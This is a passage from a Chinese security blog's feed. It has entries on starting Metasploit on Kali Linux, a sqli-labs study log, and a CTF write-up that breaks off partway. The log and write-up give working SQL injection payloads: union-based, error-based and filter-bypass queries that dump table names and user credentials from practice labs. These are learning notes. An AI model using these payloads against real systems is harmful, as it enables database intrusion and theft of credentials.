    <published>2018-05-05T14:34:21.000Z</published>
    <updated>2018-05-05T15:14:24.862Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="noopener">github地址</a></p><p>第一步:kali linux 2.0 本身已内置metasploit，kali 2.0 已经没有metasploit 这个服务了，所以service metasploit start 的方式不起作用。</p><p>在kali 2.0中启动带数据库支持的msf方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1  首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；</span><br><span class="line">#2  初始化MSF数据库（关键步骤！）：msfdb init；</span><br><span class="line">#3  运行msfconsole：msfconsole；</span><br><span class="line">#4  在msf中查看数据库连接状态：db_status。</span><br><span class="line">DONE</span><br><span class="line">db_rebuild_cache</span><br></pre></td></tr></table></figure><p>过程如下</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service metasploit start</span><br><span class="line">Failed to start metasploit.service: Unit metasploit.service not found.</span><br><span class="line">root@kali:~# service postgresql start</span><br><span class="line">root@kali:~# msfdb init</span><br><span class="line">[i] Database already started</span><br><span class="line">[+] Creating database user &apos;msf&apos;</span><br><span class="line">[+] Creating databases &apos;msf&apos;</span><br><span class="line">[+] Creating databases &apos;msf_test&apos;</span><br><span class="line">[+] Creating configuration file &apos;/usr/share/metasploit-framework/config/database.yml&apos;</span><br><span class="line">[+] Creating initial database schema</span><br><span class="line">root@kali:~# msfconsole</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4.16.52-dev                         ]</span><br><span class="line">+ -- --=[ 1754 exploits - 1006 auxiliary - 306 post       ]</span><br><span class="line">+ -- --=[ 536 payloads - 41 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql connected to msf</span><br><span class="line">msf &gt; DONE</span><br><span class="line">[-] Unknown command: DONE.</span><br><span class="line">msf &gt; db_rebuild_cache </span><br><span class="line">[*] Purging and rebuilding the module cache in the background...</span><br><span class="line">msf &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    banner        Display an awesome metasploit banner</span><br><span class="line">    cd            Change the current working directory</span><br><span class="line">    color         Toggle color</span><br><span class="line">    connect       Communicate with a host</span><br><span class="line">    exit          Exit the console</span><br><span class="line">    get           Gets the value of a context-specific variable</span><br><span class="line">    getg          Gets the value of a global variable</span><br><span class="line">    grep          Grep the output of another command</span><br><span class="line">    help          Help menu</span><br><span class="line">    history       Show command history</span><br><span class="line">    irb           Drop into irb scripting mode</span><br><span class="line">    load          Load a framework plugin</span><br><span class="line">    quit          Exit the console</span><br><span class="line">    route         Route traffic through a session</span><br><span class="line">    save          Saves the active datastores</span><br><span class="line">    sessions      Dump session listings and display information about sessions</span><br><span class="line">    set           Sets a context-specific variable to a value</span><br><span class="line">    setg          Sets a global variable to a value</span><br><span class="line">    sleep         Do nothing for the specified number of seconds</span><br><span class="line">    spool         Write console output into a file as well the screen</span><br><span class="line">    threads       View and manipulate background threads</span><br><span class="line">    unload        Unload a framework plugin</span><br><span class="line">    unset         Unsets one or more context-specific variables</span><br><span class="line">    unsetg        Unsets one or more global variables</span><br><span class="line">    version       Show the framework and console library version numbers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    advanced      Displays advanced options for one or more modules</span><br><span class="line">    back          Move back from the current context</span><br><span class="line">    edit          Edit the current module or a file with the preferred editor</span><br><span class="line">    info          Displays information about one or more modules</span><br><span class="line">    loadpath      Searches for and loads modules from a path</span><br><span class="line">    options       Displays global options or for one or more modules</span><br><span class="line">    popm          Pops the latest module off the stack and makes it active</span><br><span class="line">    previous      Sets the previously loaded module as the current module</span><br><span class="line">    pushm         Pushes the active or list of modules onto the module stack</span><br><span class="line">    reload_all    Reloads all modules from all defined module paths</span><br><span class="line">    reload_lib    Load a library file from specified path</span><br><span class="line">    search        Searches module names and descriptions</span><br><span class="line">    show          Displays modules of a given type, or all modules</span><br><span class="line">    use           Selects a module by name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Job Commands</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    handler       Start a payload handler as job</span><br><span class="line">    jobs          Displays and manages jobs</span><br><span class="line">    kill          Kill a job</span><br><span class="line">    rename_job    Rename a job</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Resource Script Commands</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    makerc        Save commands entered since start to a file</span><br><span class="line">    resource      Run the commands stored in a file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Credentials Backend Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    creds         List all credentials in the database</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第一步:kali linux 2.0 本身已内置metasploit，kali 2.0 已经没有metasploit 这个服务了，所以service metasploit start 的方式不起作用。&lt;/p&gt;
&lt;p&gt;在kali 2.0中启动带数据库支持的msf方式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#1  首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#2  初始化MSF数据库（关键步骤！）：msfdb init；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#3  运行msfconsole：msfconsole；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#4  在msf中查看数据库连接状态：db_status。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DONE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;db_rebuild_cache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;过程如下&lt;/p&gt;
    
    </summary>
    
    
      <category term="kali linux" scheme="http://blog.Lhaihai.wang/tags/kali-linux/"/>
    
  </entry>
  
  <entry>
    <title>sql_labs学习记录（1）</title>
    <link href="http://blog.Lhaihai.wang/2018/05/05/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89/"/>
    <id>http://blog.Lhaihai.wang/2018/05/05/sql-labs学习记录（1）/</id>
    <published>2018-05-05T01:52:11.000Z</published>
    <updated>2018-05-06T06:49:29.272Z</updated>
    
    <content type="html"><![CDATA[<h3 id="less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485324116.png" alt="1525485324116"></p><p>不选择数据库的话它会把很多个users表的字段爆出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&apos;users&apos; -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485367696.png" alt="1525485367696"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487548474.png" alt="1525487548474"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(concat_ws(&apos;_&apos;,id,username,password)) ,3 from users -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487267862.png" alt="1525487267862"></p><h3 id="less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="less 2  GET - Error based - Intiger based (基于错误的GET整型注入)"></a>less 2  GET - Error based - Intiger based (基于错误的GET整型注入)</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?</span><br><span class="line">id=-1 union select 1,concat_ws(char(32,58,32),database(),user(),version()),3 -- </span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs-master/Less-2/?</span><br><span class="line">id=-1 union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- </span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs-master/Less-2/?</span><br><span class="line">id=-1 union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) ,3 from users --</span><br></pre></td></tr></table></figure><h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less 3  GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less 3  GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/</span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(database(),version()),3 -- +</span><br><span class="line"></span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()  -- +</span><br><span class="line"></span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &apos;users&apos; and table_schema = database()  -- +</span><br><span class="line"></span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)),3 from users -- +</span><br></pre></td></tr></table></figure><h3 id="less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="less 4  GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>less 4  GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1.1&quot;)  union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)),3 from users -- +</span><br></pre></td></tr></table></figure><h3 id="less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23  </span><br><span class="line"></span><br><span class="line">查表</span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select table_name from information_schema.tables where table_schema = database() limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select table_name from information_schema.tables where table_schema = database() limit 3, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">查列</span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 1, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 2, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">查数据</span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select username from users  limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure><h3 id="less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select count(*),count(*), concat((select username from users  limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure><h3 id="less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="less 7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>less 7 GET - Dump into outfile - String （导出文件GET字符型注入）</h3><h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h3><p>参考链接:</p><p><a href="https://blog.csdn.net/u012763794/article/details/51207833#t6" target="_blank" rel="noopener">通过sqli-labs学习sql注入——基础挑战之less1-10</a> </p><p><a href="https://blog.csdn.net/csu_vc/article/details/78150247" target="_blank" rel="noopener">sqli-labs学习记录（三）</a> </p><p><a href="https://blog.csdn.net/csu_vc/article/details/78165936" target="_blank" rel="noopener">sqli-labs学习记录（四）</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入&quot;&gt;&lt;a href=&quot;#less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入&quot; class=&quot;headerlink&quot; title=&quot;less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)&quot;&gt;&lt;/a&gt;less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485324116.png&quot; alt=&quot;1525485324116&quot;&gt;&lt;/p&gt;
&lt;p&gt;不选择数据库的话它会把很多个users表的字段爆出来&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&amp;apos;users&amp;apos; -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485367696.png&quot; alt=&quot;1525485367696&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_schema=&amp;apos;security&amp;apos; and table_name=&amp;apos;users&amp;apos; -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487548474.png&quot; alt=&quot;1525487548474&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(concat_ws(&amp;apos;_&amp;apos;,id,username,password)) ,3 from users -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487267862.png&quot; alt=&quot;1525487267862&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入&quot;&gt;&lt;a href=&quot;#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入&quot; class=&quot;headerlink&quot; title=&quot;less 2  GET - Error based - Intiger based (基于错误的GET整型注入)&quot;&gt;&lt;/a&gt;less 2  GET - Error based - Intiger based (基于错误的GET整型注入)&lt;/h3&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL" scheme="http://blog.Lhaihai.wang/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>百度杯CTF夺旗大赛9月场第二场SQL</title>
    <link href="http://blog.Lhaihai.wang/2018/05/02/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E5%A4%BA%E6%97%97%E5%A4%A7%E8%B5%9B9%E6%9C%88%E5%9C%BA%E7%AC%AC%E4%BA%8C%E5%9C%BASQL/"/>
    <id>http://blog.Lhaihai.wang/2018/05/02/百度杯CTF夺旗大赛9月场第二场SQL/</id>
    <published>2018-05-02T13:48:55.000Z</published>
    <updated>2018-05-02T14:29:56.476Z</updated>
    
    <content type="html"><![CDATA[<h4 id="首先看看是否有字符过滤"><a href="#首先看看是否有字符过滤" class="headerlink" title="首先看看是否有字符过滤"></a>首先看看是否有字符过滤</h4><p>把所有字符串都试一遍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?id = 1~!@$%^&amp;*()_+-=&#123;&#125;[]&apos;&quot;;&lt;&gt;/?</span><br></pre></td></tr></table></figure><p>发现&lt;&gt;直接被删除，即是：<code>sele&lt;&gt;ct --&gt; select</code><br>符号+被替换为空格等等</p><a id="more"></a><h4 id="获取当前表的字段个数："><a href="#获取当前表的字段个数：" class="headerlink" title="获取当前表的字段个数："></a>获取当前表的字段个数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 ord&lt;&gt;er by 3</span><br></pre></td></tr></table></figure><p> 正常返回</p><h4 id="联合注入，获取可以显示的字段"><a href="#联合注入，获取可以显示的字段" class="headerlink" title="联合注入，获取可以显示的字段"></a>联合注入，获取可以显示的字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3</span><br></pre></td></tr></table></figure><p>执行之后，第二个字段被显示出来，说明三个字段只有第二个字段可以显示。</p><h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 